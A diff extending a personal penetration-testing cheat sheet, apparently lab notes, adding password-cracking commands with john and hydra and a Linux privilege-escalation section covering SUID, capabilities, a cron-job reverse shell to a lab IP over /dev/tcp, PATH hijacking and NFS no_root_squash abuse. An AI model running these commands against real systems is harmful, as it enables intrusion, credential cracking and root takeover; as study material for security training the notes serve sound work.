@@ -16,6 +16,8 @@
       source ~/.bashrc
       ```
     - [ssh2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
+    - ``unshadow passwd.txt shadow.txt > to-crack.txt ``
+      ``john --wordlist=rockyou.txt to-crack.txt``
   - [hydra](https://github.com/vanhauser-thc/thc-hydra)
     - ``hydra -l username -P wordlist.txt server service``
     - ``hydra -l username -P wordlist.txt service://[MACHINE_IP]:service_port``
@@ -319,7 +321,72 @@
       3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
          * ``sudo LD_PRELOAD=/home/user/ldpreload/shell.so find``
   * SUID
-  * 
+    * List the files that have SUID or SGID set
+      ``find / -type f -perm -04000 -ls 2>/dev/null``
+    * ``nano``
+    * ``base64``
+  * Capabilities
+    * ``getcap``
+    * List enables capabilities
+      ``getcap -r / 2>/dev/null``
+  * Cron Jobs
+    * ``/etc/crontab``
+    * Reverse  Shell
+      ``#!/bin/bash``
+      ``bash -i &> /dev/tcp/10.10.217.232/1234 0>&1``
+    * ``chmod +x target_file``
+  * PATH
+    * ``echo $PATH``
+    * Write a script (`gateway`) that will search for a command (`attack`) from the `PATH
+
+      ```python
+      #!/usr/bin/python3
+      import os
+      import sys
+
+      try: 
+              os.system("/bin/bash")
+      except:
+              sys.exit()
+      ```
+
+      Make it executable.
+    * Set SUID bit
+      ``chmod u+s gateway``
+    * If we have write access to any paths mentioned in `PATH`, we create a binary (`attack`) named same as the command
+
+      * attack
+        ``echo "/bin/bash" >> attack``
+        ``chmod 777 attack``
+      * Find writable folders
+        ``find / -writable 2>/dev/null``
+        ``find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u``
+        ``find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u``
+      * Add folder to `PATH`
+        ``export PATH=/folder_name:$PATH``
+    * Now, if we run the script (`gateway`), the script will run the binary (`attack`) with root priviledge.
+  * NFS
+    * On target machine
+      ``cat /etc/exports``
+      Find share with ``no_root_squash``
+    * Enumerate mountable shares
+      ``showmount -e target_ip``
+    * Mount one of the `no_root_squash` shares to the attacking machine.
+    * Build a executable (`attack.py`)
+      ```
+      #!/usr/bin/python3
+      import os
+      import sys
+
+      try: 
+              os.system("/bin/bash")
+      except:
+              sys.exit()
+      ```
+    * Set SUID bit
+      ``chmod +s attack.py``
+    * Copy it to the mounted directory
+    * Execute it from target machine (shell)
 * Windows
 
 #### OSINT
